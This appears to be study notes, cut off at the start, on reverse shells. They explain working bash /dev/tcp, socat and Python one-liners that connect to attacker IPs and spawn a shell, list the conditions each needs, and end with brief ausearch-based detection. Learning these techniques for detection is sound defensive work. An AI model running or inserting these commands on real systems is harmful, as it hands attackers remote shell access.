- a session from the victim to the attacker

# Methods to Open Reverse Shell 

# Bash
```
bash -i >& /dev/tcp/10.10.10.10/1337 0>&1 

bash -i -> starts a new interactive shell
/dev/tcp/ip/port -> opens a tcp connection to IP and port 

>& -> redirects output to the specified connection
0>&1 -> redirects input to the same destination as the output

victim is forced to connect to 10.10.10.10:1337 and launch bash 
```

Limitations: 
1. Must be listening 
2. Victim is allowed to make the outbound connection
3. Target system uses bash 
4. Target system should support the feature 
5. The shell runs with privileges of the process that launched it 

---
# SOCAT
```
socat TCP:10.10.10.10:2555 EXEC:'bash',pty,stderr,setsid,sigint,sane

EXEC:'bash' -> creates a bash process 
pty -> creates a pseudoterminal, making it behave like an interactive shell 
stderr -> redirects error to the connection
setsid -> starts the shell in a new session
sigint -> allows interrupt to be passed like Ctrl + C 
sane -> configures the terminal with normal settings 
```

This one's better compared to bash since this provides a pseudo-terminal

`socat` may be legitimate, but the addition of `bash` can be questioned

# Python
```
python3 -c 'import socket,os,pty;s=socket.create_connection(("10.30.30.30",80));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("bash")'
```



# How do we detect reverse shells? 
Using ausearch, again 

```
ausearch -i -x [socat,python,bash]

and then we follow the parent process ID again 
```
